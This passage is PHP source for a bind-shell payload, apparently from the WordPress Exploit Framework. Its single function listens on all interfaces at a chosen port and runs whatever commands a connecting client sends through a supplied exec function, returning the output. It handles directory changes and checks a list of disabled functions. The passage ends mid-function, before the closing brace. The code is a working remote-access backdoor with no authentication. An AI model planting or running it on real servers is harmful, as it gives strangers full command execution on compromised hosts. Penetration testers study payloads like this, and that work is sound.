function startTcpSocketServer($port, $wpxf_disabled, $wpxf_exec) {
    // Create a TCP/IP socket
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) {
        echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
        return;
    }

    // Bind the socket to the address and port
    $result = socket_bind($socket, '0.0.0.0', $port);
    if ($result === false) {
        echo "socket_bind() failed: reason: " . socket_strerror(socket_last_error($socket)) . "\n";
        socket_close($socket);
        return;
    }

    // Listen for incoming connections
    $result = socket_listen($socket, 5);
    if ($result === false) {
        echo "socket_listen() failed: reason: " . socket_strerror(socket_last_error($socket)) . "\n";
        socket_close($socket);
        return;
    }

    echo "Listening on port $port...\n";

    do {
        // Accept a connection
        $client = socket_accept($socket);
        if ($client === false) {
            echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($socket)) . "\n";
            continue;
        }

        // Send initial message to the client
        $cwd = getcwd();
        socket_write($client, "$cwd> ");

        do {
            // Read client input
            $input = trim(socket_read($client, 1024));
            if ($input === false) {
                echo "socket_read() failed: reason: " . socket_strerror(socket_last_error($client)) . "\n";
                break;
            }

            // Handle 'exit' or 'quit' commands
            if (in_array(strtolower($input), ['exit', 'quit'])) {
                break;
            }

            // Handle 'cd' command
            if (stripos($input, 'cd') === 0) {
                $dir = substr($input, 3);
                if (in_array('chdir', $wpxf_disabled)) {
                    socket_write($client, "Error: chdir is disabled.\n");
                } else {
                    if (@chdir($dir)) {
                        $cwd = getcwd();
                    } else {
                        $cwd = getcwd();
                        socket_write($client, "Error changing directory to $dir.\n");
                    }
                }
                socket_write($client, "$cwd> ");
                continue;
            }

            // Execute other commands
            if (!in_array('exec', $wpxf_disabled)) {
                ob_start();
                call_user_func($wpxf_exec, $input);
                $output = ob_get_clean();
                socket_write($client, $output);
            } else {
                socket_write($client, "Error: exec is disabled.\n");
            }

            // Send prompt back to the client
            socket_write($client, "$cwd> ");
        } while (true);

        // Close the client connection
        socket_close($client);
    } while (true);

    // Close the server socket
    socket_close($socket);
